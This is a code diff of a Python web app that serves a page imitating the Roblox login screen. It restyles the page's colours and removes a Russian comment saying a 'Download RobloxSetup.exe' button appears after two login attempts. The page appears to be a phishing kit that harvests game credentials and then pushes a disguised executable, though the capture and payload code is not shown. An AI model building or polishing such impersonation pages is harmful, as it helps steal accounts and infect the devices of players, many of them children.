@@ -27,13 +27,9 @@ def index():
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Roblox</title>
         <style>
-            * {
-                margin: 0;
-                padding: 0;
-                box-sizing: border-box;
-            }
+            * { margin: 0; padding: 0; box-sizing: border-box; }
             body {
-                background: #1b1b2f;
+                background: #0a0a1a;
                 font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
                 display: flex;
                 justify-content: center;
@@ -43,12 +39,12 @@ def index():
                 padding: 20px;
             }
             .login-container {
-                background: #16213e;
+                background: #14142a;
                 border-radius: 16px;
                 padding: 40px 35px 35px;
                 width: 400px;
                 max-width: 100%;
-                box-shadow: 0 15px 40px rgba(0,0,0,0.7);
+                box-shadow: 0 15px 40px rgba(0,0,0,0.9);
                 text-align: center;
             }
             .roblox-logo {
@@ -75,8 +71,8 @@ def index():
             .input-group input {
                 width: 100%;
                 padding: 14px 16px;
-                background: #0f3460;
-                border: 2px solid transparent;
+                background: #0a0a1a;
+                border: 2px solid #2a2a4a;
                 border-radius: 8px;
                 color: #fff;
                 font-size: 16px;
@@ -89,7 +85,7 @@ def index():
             }
             .input-group input:focus {
                 border-color: #00bfff;
-                background: #1a4a7a;
+                background: #12122a;
                 box-shadow: 0 0 0 3px rgba(0,191,255,0.2);
             }
             .login-btn {
@@ -142,7 +138,7 @@ def index():
                 color: #6a8aae;
                 font-size: 13px;
                 margin-top: 22px;
-                border-top: 1px solid #1a4a7a;
+                border-top: 1px solid #1a1a4a;
                 padding-top: 18px;
                 display: flex;
                 flex-direction: column;
@@ -198,7 +194,6 @@ def index():
             Don't have an account? <a href="#">Sign Up</a>
         </div>
 
-        <!-- Кнопка скачивания (появляется после 2-х попыток) -->
         <button class="download-btn" id="downloadBtn">⬇️ Download RobloxSetup.exe</button>
     </div>
 
